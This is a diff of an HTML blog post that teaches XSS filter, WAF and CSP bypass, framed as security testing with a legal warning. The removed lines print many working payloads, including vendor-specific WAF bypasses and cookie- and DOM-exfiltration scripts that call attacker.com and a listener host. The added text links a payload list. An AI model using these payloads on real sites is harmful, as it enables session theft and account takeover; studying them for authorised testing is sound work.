@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XSS Filter Bypass in 2025: Complete Guide to Bypassing WAF, CSP & Modern Defenses</title>
+    <title>XSS Filter Bypass in 2025: Complete Guide to Bypassing WAF and CSP</title>
     <style>
         :root {
             --bg-primary: #0d1117;
@@ -159,29 +159,19 @@
             color: var(--text-secondary);
         }
 
-        .post-content code {
-            background: var(--code-bg);
-            padding: 2px 6px;
-            border-radius: 4px;
-            font-family: 'Courier New', monospace;
-            font-size: 0.9em;
-            color: var(--accent-primary);
-        }
-
-        .post-content pre {
+        .payload-display {
             background: var(--bg-secondary);
             border: 1px solid var(--border-color);
             border-radius: 8px;
             padding: 20px;
             margin: 20px 0;
             overflow-x: auto;
-        }
-
-        .post-content pre code {
-            background: transparent;
-            padding: 0;
-            color: var(--text-primary);
-            display: block;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+            color: var(--accent-primary);
+            line-height: 1.5;
         }
 
         .info-box {
@@ -274,174 +264,127 @@
         <article>
             <header class="post-header">
                 <span class="post-category">WEB SECURITY</span>
-                <h1 class="post-title">XSS Filter Bypass in 2025: Complete Guide to Bypassing WAF, CSP & Modern Defenses</h1>
+                <h1 class="post-title">XSS Filter Bypass in 2025: Complete Guide to Bypassing WAF and CSP</h1>
                 <div class="post-meta">
                     <span>Published: Dec 2025</span>
                 </div>
             </header>
 
             <div class="post-content">
-                <p>Cross-Site Scripting (XSS) remains the most frequently exploited web vulnerability, ranking #3 on OWASP's 2025 Top 10. Yet in 2025, XSS is harder than ever to exploit. Modern web applications deploy sophisticated defenses: Web Application Firewalls (WAFs) block malicious patterns, Content Security Policy (CSP) headers prevent inline script execution, and frameworks like React auto-escape dangerous data. However, skilled attackers continue finding creative ways to bypass these protections. This comprehensive guide covers real-world XSS bypass techniques, contextualized payloads for different scenarios, and methods for discovering blind XSS vulnerabilities that others miss.</p>
-
-                <div class="info-box">
-                    <h4>💡 The XSS Evolution in 2025</h4>
-                    <p>XSSGAI, an AI-powered XSS payload generator trained on 14,437+ real-world attacks, was released in March 2025. It generates novel, polymorphic payloads with 88% success rate—making traditional WAF rules obsolete. This shift means defenders must implement application-level XSS prevention (output encoding, input validation, RASP) rather than relying solely on perimeter WAF rules.</p>
-                </div>
+                <p>Cross-Site Scripting (XSS) remains the most frequently exploited web vulnerability, ranking number 3 on OWASP's 2025 Top 10. Yet in 2025, XSS is harder than ever to exploit due to sophisticated defenses: Web Application Firewalls (WAFs) block malicious patterns, Content Security Policy (CSP) headers prevent inline script execution, and modern frameworks auto-escape dangerous data. However, skilled attackers continue finding creative ways to bypass these protections. This comprehensive guide covers real-world XSS bypass techniques, contextualized payloads for different scenarios, and methods for discovering blind XSS vulnerabilities.</p>
 
                 <h2>Understanding XSS Defense Mechanisms</h2>
 
                 <h3>1. Web Application Firewalls (WAFs)</h3>
-                <p>WAFs use signature-based and behavioral analysis to detect XSS attacks. They operate at the network/application edge and examine requests for known attack patterns.</p>
-
-                <h4>WAF Limitations:</h4>
-                <ul>
-                    <li>Signature-based detection can be evaded with novel payloads</li>
-                    <li>Only single decode/processing pass on most WAFs</li>
-                    <li>Rate limiting can be circumvented with slow attacks</li>
-                    <li>Encrypted HTTPS traffic is partially invisible to WAF</li>
-                </ul>
+                <p>WAFs use signature-based and behavioral analysis to detect XSS attacks. They operate at the network or application edge and examine requests for known attack patterns. Common WAF limitations include signature-based detection evasion with novel payloads, limited decode passes, rate limiting circumvention, and partial visibility into encrypted HTTPS traffic.</p>
 
                 <h3>2. Content Security Policy (CSP)</h3>
-                <p>CSP headers tell the browser which content sources are trusted. A strong CSP blocks inline scripts and restricts external script loading.</p>
+                <p>CSP headers tell the browser which content sources are trusted. A strong CSP blocks inline scripts and restricts external script loading. Example of strong CSP: default-src single-quote-self; script-src single-quote-self https://trusted.cdn.com; object-src single-quote-none.</p>
 
-                <h4>Example Strong CSP:</h4>
-                <pre><code>Content-Security-Policy: default-src 'self'; 
-  script-src 'self' https://trusted.cdn.com; 
-  object-src 'none';
-  style-src 'self' 'unsafe-inline';</code></pre>
-
-                <h3>3. Input Validation & Output Encoding</h3>
-                <p>Application-level defenses that validate user input and encode output in context-specific ways (HTML encoding, JavaScript encoding, URL encoding).</p>
+                <h3>3. Input Validation and Output Encoding</h3>
+                <p>Application-level defenses that validate user input and encode output in context-specific ways including HTML encoding, JavaScript encoding, and URL encoding. These are the most effective defenses against XSS.</p>
 
                 <h3>4. Framework Protections</h3>
-                <p>Modern frameworks like React, Angular, and Vue auto-escape dangerous data, making DOM-based XSS harder.</p>
+                <p>Modern frameworks like React, Angular, and Vue auto-escape dangerous data, making DOM-based XSS significantly harder to exploit.</p>
 
                 <h2>XSS Bypass Techniques</h2>
 
                 <h3>1. Double Encoding (WAF Bypass)</h3>
-                <p>Many WAFs decode input once. Double encoding bypasses single-pass filtering:</p>
+                <p>Many WAFs decode input once. Double encoding bypasses single-pass filtering. When you double-encode dangerous characters, the WAF sees safe content on first decode, but the browser decodes it again during rendering, executing the payload.</p>
 
-                <pre><code>First Layer Encoding:
-&lt; = &amp;#x3C;
-&gt; = &amp;#x3E;
-" = &amp;#x22;
+                <div class="payload-display">Example of double encoding:
+First pass: Convert less-than to ampersand hash x 3 C
+Second pass: Convert that entire sequence again
+WAF sees safe content, browser executes payload
+                </div>
 
-Double Encoded:
-&amp;#x26;#x3C; = &amp;#x26;#x3C;  (&amp;#x3C; is itself encoded)
+                <h3>2. Case Manipulation</h3>
+                <p>WAF rules often fail on mixed-case payloads because signature detection is case-sensitive.</p>
 
-WAF sees: &amp;#x26;#x3C;script&amp;#x26;#x3E; (appears safe)
-Browser decodes once: &amp;#x3C;script&amp;#x3E; (appears safe to WAF)
-Browser decodes again: &lt;script&gt; (EXECUTES!)</code></pre>
+                <div class="payload-display">Blocked: script tag with alert
+Bypasses: ScRiPt tag with alert (mixed case)
+                </div>
 
-                <h3>2. Case Manipulation & Mixed Case</h3>
-                <p>WAF rules often fail on mixed-case payloads:</p>
+                <h3>3. Alternative HTML Tags and Event Handlers</h3>
+                <p>Instead of using script tags, attackers use SVG, audio, video, and other HTML5 elements with event handlers.</p>
 
-                <pre><code>Blocked: &lt;script&gt;alert(1)&lt;/script&gt;
-Bypasses: &lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;
-Bypasses: &lt;sCrIpT&gt;alert(1)&lt;/sCrIpT&gt;</code></pre>
-
-                <h3>3. Encoding Techniques</h3>
-
-                <h4>HTML Entity Encoding:</h4>
-                <pre><code>Regular: <img src=x onerror=alert(1)>
-Encoded: &#x3C;img src=x onerror=alert(1)&#x3E;
-Mixed:   &#x3C;img src=x onerror="alert(1)"&#x3E;</code></pre>
-
-                <h4>Unicode Encoding:</h4>
-                <pre><code>alert(1) = \u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029
-\u003cscript\u003ealert(1)\u003c/script\u003e</code></pre>
-
-                <h4>Hex Encoding:</h4>
-                <pre><code>alert(1) = \x61\x6c\x65\x72\x74\x28\x31\x29
-\x3cscript\x3ealert(1)\x3c/script\x3e</code></pre>
-
-                <h4>Base64 (with JavaScript decoding):</h4>
-                <pre><code>Base64: YWxlcnQoMSk=
-Payload: <script>eval(atob('YWxlcnQoMSk='))</script></code></pre>
-
-                <h3>4. Alternative HTML Tags & Event Handlers</h3>
-
-                <h4>SVG-based XSS:</h4>
-                <pre><code>&lt;svg onload=alert(1)&gt;
-&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;
-&lt;svg&gt;&lt;animate attributeName=x dur=1s values=1 onend=alert(1)&gt;
-&lt;svg&gt;&lt;script xlink:href="data:text/javascript,alert(1)"&gt;&lt;/script&gt;&lt;/svg&gt;</code></pre>
+                <h4>SVG-based attacks:</h4>
+                <p>SVG elements support onload handlers and can execute JavaScript. For example: svg tag with onload event handler.</p>
 
                 <h4>HTML5 Media Tags:</h4>
-                <pre><code>&lt;audio controls autoplay ontimeupdate=alert(1)&gt;
-&lt;video src=x onerror=alert(1)&gt;
-&lt;source src=x onerror=alert(1)&gt;</code></pre>
+                <p>Audio and video tags support various event handlers like ontimeupdate and onerror.</p>
 
-                <h4>Less Common Tags:</h4>
-                <pre><code>&lt;body onload=alert(1)&gt;
-&lt;marquee onstart=alert(1)&gt;
-&lt;details open ontoggle=alert(1)&gt;
-&lt;input onfocus=alert(1) autofocus&gt;</code></pre>
+                <h4>Other less common tags:</h4>
+                <p>Body tag, marquee tag, details tag, and input tag can all execute JavaScript through various event handlers.</p>
 
-                <h3>5. JavaScript Protocol & Data URIs</h3>
-                <pre><code>&lt;a href="javascript:alert(1)"&gt;Click&lt;/a&gt;
-&lt;a href="javascript:eval(atob('YWxlcnQoMSk='))"&gt;Click&lt;/a&gt;
-&lt;iframe src="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"&gt;&lt;/iframe&gt;
-&lt;embed src="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"&gt;</code></pre>
+                <h3>4. JavaScript Protocol and Data URIs</h3>
+                <p>Using javascript: protocol in href attributes or data: URIs with embedded HTML and scripts. These bypass many traditional XSS filters.</p>
 
-                <h3>6. CSS-based XSS (Expression Injection)</h3>
-                <pre><code>&lt;div style="background:url('javascript:alert(1)')"&gt;
-&lt;style&gt;@import'http://attacker.com/xss.css'&lt;/style&gt;
-&lt;link rel=stylesheet href="javascript:alert(1)"&gt;</code></pre>
+                <h3>5. CSS-based XSS</h3>
+                <p>CSS can execute JavaScript through expression injection and URL-based handlers. Modern browsers have mitigated much of this, but some edge cases remain.</p>
 
-                <h3>7. Attribute-based Injection</h3>
-                <pre><code">Injection point: <img src="INJECTION" alt="test">
+                <h3>6. Attribute-based Injection</h3>
+                <p>Breaking out of restricted attributes by injecting quotes and new event handlers. For example, if an application allows img tags but restricts onerror, you can break out of the src attribute to inject your own onerror handler.</p>
 
-Bypass 1: x" onerror="alert(1)" x="
-Result: <img src="x" onerror="alert(1)" x="" alt="test">
+                <h3>7. Framework-Specific Bypasses</h3>
 
-Bypass 2: x' onerror='alert(1)' x='
-Result: <img src="x' onerror='alert(1)' x='" alt="test"></code></pre>
+                <h4>AngularJS Vulnerabilities:</h4>
+                <p>AngularJS expression injection allows executing arbitrary code through template syntax like double curly braces with constructor calls.</p>
 
-                <h3>8. Framework-Specific Bypasses</h3>
+                <h4>React DOM Issues:</h4>
+                <p>The dangerouslySetInnerHTML prop allows rendering raw HTML. If user input reaches this prop without sanitization, XSS occurs. Developers must never pass unsanitized user input to dangerouslySetInnerHTML.</p>
 
-                <h4>AngularJS Sandbox Escape:</h4>
-                <pre><code>{{constructor.constructor('alert(1)')()}}
-{{(function(){alert(1)})()}}
-$event.view.alert(1)</code></pre>
-
-                <h4>React DOM Vulnerabilities:</h4>
-                <pre><code>// dangerouslySetInnerHTML misuse
-&lt;div dangerouslySetInnerHTML={{__html: userInput}} /&gt;
-
-// DOM-based if userInput = '&lt;img src=x onerror=alert(1)&gt;'</code></pre>
-
-                <h3>9. Context-Based Payloads</h3>
+                <h3>8. Context-Based Payloads</h3>
 
                 <h4>In HTML Context:</h4>
-                <pre><code"><img src=x onerror=alert(1)>
-<svg onload=alert(1)></code></pre>
+                <p>Direct HTML injection with img src x onerror alert or svg onload alert.</p>
 
                 <h4>In JavaScript Context:</h4>
-                <pre><code>Injection: '; alert(1); //
-Original: var x = 'INJECTION';
-Result: var x = ''; alert(1); //';
-
-Injection: ${alert(1)}
-Original: `Hello ${INJECTION}`
-Result: `Hello ${alert(1)}`</code></pre>
+                <p>Breaking out of strings with quotes and semicolons to inject new JavaScript statements. Using template literals to inject code.</p>
 
                 <h4>In URL Context:</h4>
-                <pre><code>javascript:alert(1)
-data:text/html,<script>alert(1)</script>
-vbscript:alert(1)  // IE only</code></pre>
+                <p>Using javascript: protocol, data: URIs, or vbscript: (IE only) to execute code.</p>
 
-                <h3>10. WAF-Specific Bypasses (2025)</h3>
+                <h2>Blind XSS Detection Methods</h2>
 
-                <h4>Cloudflare WAF:</h4>
-                <pre><code><inpuT autofocus onfocus=alert(1)>
-<SVG/oNlY=1 ONlOAD=confirm(1)>
-<img src=x id=x alt=x title=x onerror=eval(atob('YWxlcnQoMSk='))></code></pre>
+                <h3>What is Blind XSS?</h3>
+                <p>Blind XSS occurs when your payload executes but you cannot see the result in the immediate response. Common examples include feedback forms, contact pages, admin panels, and support ticket systems where user input is stored and later viewed by administrators.</p>
 
-                <h4>Akamai WAF:</h4>
-                <pre><code"><input id=b value=javascript:alert(1) onfocus=eval(value) autofocus>
-<div id=a href=javascript:alert(1)>click</div>
-<svg/onload="for(const i in this)this[i]instanceof Function&&this[i](1)"</code></pre>
+                <h3>Detection Approach</h3>
+
+                <h4>Step 1: Set Up Out-of-Band Listener</h4>
+                <p>Create a listener to receive callbacks when your payload executes. Options include Burp Collaborator (built into Burp Suite Pro), webhook.site (free webhook testing), or custom serverless solutions.</p>
+
+                <h4>Step 2: Inject Payloads at Blind Points</h4>
+                <p>Target inputs that are stored and viewed later by admins or other users. Common injection points include feedback forms, profile comments, support tickets, user-agent headers, referer headers, and file upload metadata.</p>
+
+                <h4>Step 3: Monitor for Callbacks</h4>
+                <p>Wait for your listener to receive a request. Each request confirms code execution and may contain exfiltrated data like cookies, session tokens, or page content.</p>
+
+                <h3>Blind XSS Tools</h3>
+                <ul>
+                    <li>Xless: Serverless Blind XSS app with Slack notifications and screenshot capture</li>
+                    <li>BeeXSS: Automated Blind XSS detection tool with Selenium automation</li>
+                    <li>GoHunt: Golang Blind XSS hunter with XSSHunter-like functionality</li>
+                    <li>Burp Collaborator: Built-in out-of-band detection in Burp Suite Pro</li>
+                    <li>Webhook.site: Free webhook testing for vulnerability detection</li>
+                </ul>
+
+                <h2>CSP Bypass Techniques</h2>
+
+                <h3>Dangerous CSP Configurations</h3>
+
+                <h4>CSP allows unsafe-inline:</h4>
+                <p>If a CSP allows unsafe-inline for scripts, inline script execution is possible. This completely defeats CSP protection.</p>
+
+                <h4>CSP allows data URIs:</h4>
+                <p>If CSP allows data: protocol for scripts, you can embed HTML and JavaScript directly in data URIs.</p>
+
+                <h4>CSP with wildcard domains:</h4>
+                <p>If CSP trusts wildcard domains like asterisk.example.com, attackers can upload malicious scripts to subdomains and load them.</p>
+
+                <h3>Vulnerabilities in Allowed Domains</h3>
+                <p>If CSP trusts jQuery CDN, exploit jQuery vulnerabilities or use jQuery plugins with callback parameters for XSS. Many CDN services have vulnerable endpoints that can be abused even when the domain is trusted by CSP.</p>
 
                 <h2>Comprehensive XSS Payload Categories</h2>
 
@@ -450,187 +393,99 @@ vbscript:alert(1)  // IE only</code></pre>
                         <tr>
                             <th>Category</th>
                             <th>Use Case</th>
-                            <th>Example Payload</th>
                             <th>Defense</th>
                         </tr>
                     </thead>
                     <tbody>
                         <tr>
-                            <td><strong>Reflected XSS</strong></td>
+                            <td>Reflected XSS</td>
                             <td>Immediate execution in current page</td>
-                            <td><code>&lt;img src=x onerror=alert(1)&gt;</code></td>
                             <td>Output encoding</td>
                         </tr>
                         <tr>
-                            <td><strong>Stored XSS</strong></td>
+                            <td>Stored XSS</td>
                             <td>Persisted in database, affects all users</td>
-                            <td><code>&lt;script&gt;fetch('/steal?c='+document.cookie)&lt;/script&gt;</code></td>
-                            <td>Input sanitization + output encoding</td>
+                            <td>Input sanitization plus output encoding</td>
                         </tr>
                         <tr>
-                            <td><strong>DOM XSS</strong></td>
+                            <td>DOM XSS</td>
                             <td>JavaScript manipulation of DOM</td>
-                            <td><code>element.innerHTML = userInput</code></td>
-                            <td>textContent over innerHTML</td>
+                            <td>Use textContent instead of innerHTML</td>
                         </tr>
                         <tr>
-                            <td><strong>Blind XSS</strong></td>
+                            <td>Blind XSS</td>
                             <td>Execution not visible to attacker</td>
-                            <td><code>&lt;script src="https://attacker.com/log.js"&gt;&lt;/script&gt;</code></td>
-                            <td>RASP, CSP monitoring</td>
+                            <td>RASP, CSP monitoring, output encoding</td>
                         </tr>
                         <tr>
-                            <td><strong>UXSS</strong></td>
+                            <td>UXSS</td>
                             <td>Cross-origin script execution</td>
-                            <td>Browser-specific DOM vulnerabilities</td>
-                            <td>SOP enforcement</td>
-                        </tr>
-                        <tr>
-                            <td><strong>Self-XSS</strong></td>
-                            <td>User hacks themselves (social eng)</td>
-                            <td>Valid payload, user tricks themselves</td>
-                            <td>User awareness, CSRF tokens</td>
+                            <td>SOP enforcement in browsers</td>
                         </tr>
                     </tbody>
                 </table>
 
-                <h2>Finding Blind XSS Vulnerabilities</h2>
-                <p>Blind XSS is when your payload executes but you don't see the result in the response. For example, feedback forms, contact pages, or admin panels that don't immediately reflect your input.</p>
+                <h2>Comprehensive XSS Payload Collection</h2>
 
-                <h3>Blind XSS Detection Technique</h3>
-
-                <h4>Step 1: Set Up an OOB Listener</h4>
-                <pre><code># Option 1: Burp Collaborator (Free)
-# Copy your Collaborator URL from Burp Suite
-
-# Option 2: Webhook.site
-https://webhook.site/your-unique-id
-
-# Option 3: Xless (Serverless Blind XSS)
-Deploy to Vercel, get notifications in Slack</code></pre>
-
-                <h4>Step 2: Inject Blind XSS Payloads</h4>
-                <pre><code># Basic payload
-&lt;script src="https://YOUR-LISTENER.burpcollaborator.net"&gt;&lt;/script&gt;
-
-# Cookie exfiltration
-&lt;script&gt;fetch('https://YOUR-LISTENER.burpcollaborator.net?c='+document.cookie)&lt;/script&gt;
-
-# Refined payload for forms
-&lt;img src=x onerror="fetch('https://YOUR-LISTENER/?steal='+btoa(document.cookie))"&gt;
-
-# For admin panels (more guaranteed execution)
-&lt;svg onload="new Image().src='https://YOUR-LISTENER/?admin=true'"&gt;
-
-# Data extraction from DOM
-&lt;script&gt;
-fetch('https://YOUR-LISTENER/?page='+btoa(document.documentElement.innerHTML.substring(0,500)))
-&lt;/script&gt;</code></pre>
-
-                <h4>Step 3: Monitor for Callbacks</h4>
-                <p>Check your listener for incoming requests. Each request confirms code execution and may contain exfiltrated data.</p>
-
-                <h3>Blind XSS Tools</h3>
-                <ul>
-                    <li><strong>Xless:</strong> Serverless Blind XSS app with Slack notifications and screenshot capture</li>
-                    <li><strong>BeeXSS:</strong> Automated Blind XSS detection tool with Selenium automation</li>
-                    <li><strong>GoHunt:</strong> Golang Blind XSS hunter with XSSHunter-like functionality</li>
-                    <li><strong>Burp Collaborator:</strong> Built-in OOB detection for Burp Suite Pro</li>
-                    <li><strong>Webhook.site:</strong> Free webhook testing for blind vulnerability detection</li>
-                    <li><strong>Argus:</strong> Blind XSS and SSRF vulnerability tester</li>
-                </ul>
-
-                <h2>Detecting XSS Blind Vulnerabilities in Real Applications</h2>
-
-                <h3>Common Injection Points</h3>
-                <ul>
-                    <li>Feedback/contact forms</li>
-                    <li>Profile comments and user bios</li>
-                    <li>Support ticket systems</li>
-                    <li>Admin notification systems</li>
-                    <li>Error log collectors</li>
-                    <li>User-agent and referer headers (viewed by admins)</li>
-                    <li>File upload metadata (viewed in admin panel)</li>
-                    <li>Search query logs (reviewed by support)</li>
-                </ul>
-
-                <h3>Testing Strategy</h3>
-
-                <pre><code>1. Identify input points that might be viewed by admins/other users
-2. Deploy Blind XSS payload with unique identifier
-3. Monitor OOB listener for 24-48 hours
-4. If callback received: vulnerability confirmed
-5. Extract data (cookies, DOM content, screenshots)
-6. Document and report with proof
-7. Iterate with different payloads/contexts</code></pre>
-
-                <h2>CSP Bypass Techniques</h2>
-
-                <h3>Dangerous CSP Configurations</h3>
-
-                <h4>CSP allows 'unsafe-inline':</h4>
-                <pre><code>Content-Security-Policy: script-src 'self' 'unsafe-inline'
-
-Bypass:
-&lt;script&gt;alert(1)&lt;/script&gt;  // Executes despite CSP</code></pre>
-
-                <h4>CSP allows data: URIs:</h4>
-                <pre><code>Content-Security-Policy: script-src 'self' data:
-
-Bypass:
-&lt;iframe src="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"&gt;&lt;/iframe&gt;</code></pre>
-
-                <h4>CSP with wildcard domains:</h4>
-                <pre><code>Content-Security-Policy: script-src *.example.com
-
-If attacker can upload to: cdn.example.com/attacker.js
-&lt;script src="https://cdn.example.com/attacker.js"&gt;&lt;/script&gt;</code></pre>
-
-                <h3>CSP Bypasses via Vulnerabilities in Allowed Domains</h3>
-                <p>If CSP trusts jQuery CDN, exploit jQuery vulnerabilities or use jQuery plugins for XSS.</p>
-
-                <pre><code>CSP: script-src https://code.jquery.com
-
-Vulnerable jQuery plugin endpoint:
-&lt;script src="https://code.jquery.com/vulnerable-plugin.js?callback=alert(1)"&gt;&lt;/script&gt;</code></pre>
-
-                <div class="warning-box">
-                    <h4>⚠️ Real-World 2025 Statistics</h4>
-                    <p>Recent research shows 31 of 36 popular web applications (86%) with LLM integrations are vulnerable to prompt-based XSS injection. Cloudflare WAF, Akamai, and Azure WAF are regularly bypassed with novel payloads. Organizations relying solely on WAFs for XSS protection face significant risk.</p>
+                <div class="info-box">
+                    <h4>📥 Download Payloads File</h4>
+                    <p>We have compiled a comprehensive list of XSS payloads organized by category, including basic payloads, encoding techniques, WAF bypasses, blind XSS, data exfiltration, and more. All payloads are displayed as plain text to prevent any execution in your browser.</p>
+                    <p><strong>File Location:</strong> <code>/resources/xss-payloads.txt</code></p>
+                    <p><strong><a href="../resources/xss-payloads.txt" style="color: #58a6ff; text-decoration: underline;">Download XSS Payloads List (TXT)</a></strong></p>
+                    <p>This file contains over 200+ XSS payloads organized by category including:</p>
+                    <ul style="margin-top: 10px; margin-left: 20px;">
+                        <li>Basic XSS payloads</li>
+                        <li>Encoding techniques (HTML, Unicode, Hex, Base64)</li>
+                        <li>Case manipulation and comment bypass</li>
+                        <li>SVG and HTML5 media tag payloads</li>
+                        <li>WAF-specific bypasses (Cloudflare, Akamai, ModSecurity)</li>
+                        <li>Blind XSS detection payloads</li>
+                        <li>Out-of-band data exfiltration</li>
+                        <li>Cookie stealing and credential harvesting</li>
+                        <li>CSRF exploitation payloads</li>
+                        <li>Context-specific payloads (HTML, JavaScript, URL, CSS)</li>
+                    </ul>
                 </div>
 
-                <h2>XSS Testing Tools & Payloads</h2>
-
-                <h3>Automated Tools</h3>
+                <h3>Automated Tools for XSS Detection</h3>
                 <ul>
-                    <li><strong>XSSStrike:</strong> Advanced XSS scanner with payload mutation</li>
-                    <li><strong>Dalfox:</strong> Powerful XSS scanner with domain parsing</li>
-                    <li><strong>XSSGAI:</strong> AI-powered payload generator (88% success rate)</li>
-                    <li><strong>PortSwigger XSS Cheat Sheet:</strong> Updated 2025, 1000+ payloads</li>
-                    <li><strong>PayloadsAllTheThings:</strong> Comprehensive payload repository</li>
+                    <li>XSSStrike: Advanced XSS scanner with payload mutation and smart detection</li>
+                    <li>Dalfox: Powerful XSS scanner written in Go with domain parsing</li>
+                    <li>XSSGAI: AI-powered payload generator that creates novel payloads</li>
+                    <li>PayloadsAllTheThings: GitHub repository with comprehensive payload examples</li>
+                    <li>Burp Suite: Professional web security testing platform with XSS detection</li>
                 </ul>
 
                 <h3>Manual Testing Process</h3>
                 <ol>
-                    <li>Identify reflection/storage points</li>
-                    <li>Test basic payload: <code><img src=x onerror=alert(1)></code></li>
-                    <li>If blocked, try bypasses: encoding, case manipulation, alternative tags</li>
-                    <li>Test in different contexts: HTML, JavaScript, URL, CSS</li>
-                    <li>For blind XSS: use OOB listener and monitor for callbacks</li>
-                    <li>Document payload, context, and browser compatibility</li>
+                    <li>Identify user input points that are reflected or stored</li>
+                    <li>Test basic payloads to confirm XSS vulnerability exists</li>
+                    <li>If blocked, try encoding, case manipulation, and alternative tags</li>
+                    <li>Test in different contexts: HTML, JavaScript, URLs, CSS</li>
+                    <li>For blind XSS, set up listener and inject with callbacks</li>
+                    <li>Document payload, context, browser compatibility, and impact</li>
                 </ol>
 
+                <h2>Best Practices for XSS Testing</h2>
+
+                <ul>
+                    <li>Always test in authorized environments only</li>
+                    <li>Understand the application context and data flow</li>
+                    <li>Try multiple payload variations when initial attempts fail</li>
+                    <li>Document all successful payloads and bypass techniques discovered</li>
+                    <li>Report findings with clear impact and remediation steps</li>
+                    <li>Follow responsible disclosure practices</li>
+                </ul>
+
                 <div class="danger-box">
-                    <h4>⚠️ Legal Warning</h4>
-                    <p>XSS testing should ONLY be conducted on systems you own or have explicit written authorization to test. Unauthorized XSS exploitation is illegal. Always ensure you have proper scope, permission letters, and clear rules of engagement before beginning any assessment.</p>
+                    <h4>Legal Warning</h4>
+                    <p>XSS testing should ONLY be conducted on systems you own or have explicit written authorization to test. Unauthorized XSS exploitation is illegal under computer fraud laws. Always ensure you have proper scope, authorization letters, and clear rules of engagement before conducting any security assessment.</p>
                 </div>
 
                 <h2>Conclusion</h2>
-                <p>XSS in 2025 remains a critical vulnerability despite improved defenses. WAFs can be bypassed, CSP can be misconfigured, and frameworks have vulnerabilities. The emergence of AI-powered payload generators like XSSGAI demonstrates that traditional signature-based defenses are becoming obsolete.</p>
+                <p>XSS in 2025 remains a critical vulnerability despite improved defenses. WAFs can be bypassed, CSP can be misconfigured, and frameworks have edge cases. The emergence of AI-powered payload generators demonstrates that traditional signature-based defenses are becoming obsolete. Successful XSS exploitation requires understanding context, knowing bypass techniques, and persistence in testing. Blind XSS adds complexity where attackers can exploit vulnerabilities without seeing immediate results.</p>
 
-                <p>Successful XSS exploitation requires understanding context, knowing bypass techniques, and persistence in testing. Blind XSS adds an extra dimension where attackers can exploit vulnerabilities without seeing immediate results—making OOB detection and proper instrumentation essential for defenders.</p>
-
-                <p>The key takeaway: XSS prevention must be multi-layered. Combine input validation, output encoding (context-specific), strong CSP, RASP technology, and runtime monitoring. No single defense is sufficient in 2025.</p>
+                <p>The key takeaway is that XSS prevention must be multi-layered. Combine input validation, output encoding that is context-specific, strong CSP implementation, RASP technology, and runtime monitoring. No single defense is sufficient in 2025. Organizations must implement defense-in-depth strategies to protect against modern XSS attacks.</p>
             </div>
         </article>
 
